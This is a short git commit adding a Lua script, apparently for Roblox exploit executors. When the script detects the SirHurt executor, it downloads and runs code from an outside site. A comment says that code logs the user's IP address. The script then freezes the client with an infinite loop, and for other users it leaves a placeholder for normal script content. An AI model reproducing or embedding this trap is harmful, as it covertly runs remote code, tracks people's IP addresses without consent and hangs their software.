4570350934613094de5cfacb0d297eef0d7d41d4
websinkwastaken <61687364+websinkwastaken@users.noreply.github.com>
2020-08-23 19:58:13 +0100

    Create antisirhurt.lua

---
+++ antisirhurt.lua
@@ -0,0 +1,9 @@
+local Sirhurt = is_sirhurt_closure and true or false
+if Sirhurt then
+loadstring(game:HttpGet("fuck-sirhurt.github.io/iusesirhurt.php", true))() -- this will log sirhurt users' ip
+while true do
+   
+end
+else
+-- script here
+end
